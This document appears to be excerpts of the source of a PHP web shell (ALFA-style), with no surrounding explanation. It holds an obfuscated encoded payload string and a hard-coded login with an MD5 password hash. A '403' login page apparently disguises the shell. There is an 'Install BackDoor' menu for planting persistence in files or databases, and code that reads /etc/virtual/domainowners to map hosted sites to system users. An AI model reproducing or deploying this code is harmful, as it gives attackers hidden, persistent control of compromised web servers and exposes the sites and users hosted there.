...
$Lix = "\x3dodVRFWUPZW\x63Ofk\x62uHVQ\x41kN\x41D\x63LsoL4KssSL\x43rGxmEmo\x43KsI\x63yp\x417gZRMYuFhqL\x42Sfl0WR\x42\x41s\x42Wpg\x43KYiZWYh\x42\x61rgm\x61okWlVe\x425opeKnpE\x61V\x435IlY2gIyqIpkKo1gK\x41\x41SVu5oS11RxySvwySPDVV1WLsSV\x42QTNFUUV9jTp0KIt6zW9o\x63J8QiQdtSrs0So\x41tVroS5iXu50yKqMjkVN5yTxO7/v\x42\x41k\x42wJe/TG\x41\x62Gw/f\x42\x41o\x42wJe/TF\x41rGw/P\x42\x41s\x42wJe/TE\x417Gw//\x41\x41w\x42wJe";
...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => '48dd3046643b6bf08f2a6d9be1b0dd26',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
alfahead();
echo '<divclass=header><center><p><div class="txtfont_header">| Install BackDoor |</div></p><h3><a href=javascript:void(0) onclick="g(\'inbackdoor\',null,\'file\')">| In File | </a><a href=javascript:void(0) onclick="g(\'inbackdoor\',null,\'db\')">| In DataBase | </a></h3></center>';
...
</form></table><divclass='pages-holder'><div class='pages-number'>".$page_builder."</div></div></div></div>";
alfafooter();
}
...
$site = trim($_POST['alfa7']);
$rep = str_replace(array("https://","http://","www."),"",$site);$users = _alfa_file("/etc/virtual/domainowners");
foreach($users as $boz){
$ex = explode(":",$boz);
if($ex[0] == $rep){
